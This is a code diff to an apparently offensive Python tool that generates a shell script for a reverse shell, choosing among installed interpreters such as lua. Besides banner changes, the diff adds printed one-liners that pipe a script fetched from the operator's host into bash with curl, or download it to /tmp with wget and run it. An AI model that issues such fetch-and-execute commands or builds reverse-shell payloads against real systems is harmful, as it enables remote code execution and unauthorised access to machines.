@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import sys
 import argparse
+import os
 class bcolors:
     HEADER = '\033[95m'
     OKBLUE = '\033[94m'
@@ -12,14 +13,15 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 banner = f'''{bcolors.OKCYAN}
-░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░███████╗██╗░░░██╗░░░░██████╗██╗░░██╗
-██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║░░░██║░░░██╔════╝██║░░██║
+░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░███████╗██╗░░░██╗░░░░██████╗██╗░░██╗                                                                                               
+██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║░░░██║░░░██╔════╝██║░░██║                                                                                               
 ███████║██║░░░██║░░░██║░░░██║░░██║██████╔╝█████╗░░╚██╗░██╔╝░░░╚█████╗░███████║
 ██╔══██║██║░░░██║░░░██║░░░██║░░██║██╔══██╗██╔══╝░░░╚████╔╝░░░░░╚═══██╗██╔══██║
 ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║███████╗░░╚██╔╝░░██╗██████╔╝██║░░██║
 ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝╚═════╝░╚═╝░░╚═╝
--------------------------------------------------------------------------------
-                                    BoyFromFuture
+-------------------------------------------------------------------------------{bcolors.ENDC}
+ {bcolors.WARNING}Github  ❯ https://github.com/root-tanishq/autorev.sh/{bcolors.ENDC}
+ {bcolors.WARNING}Twitter ❯ https://twitter.com/root_tanishq{bcolors.OKCYAN}
 -------------------------------------------------------------------------------'''
 print(banner)
 parser = argparse.ArgumentParser()
@@ -103,4 +105,5 @@ elif [ $(which lua >/dev/null ; echo $?) == 0 ];then
 fi
 '''
 open(f'{args.out}.sh','w').write(script)
-
+print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "curl"{bcolors.WARNING}❯ curl http://{args.ipaddr}/{args.out}.sh | bash')
+print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC}Command "wget"{bcolors.WARNING}❯ wget http://{args.ipaddr}/{args.out}.sh -O /tmp/{args.out}.sh && bash /tmp/{args.out}.sh')
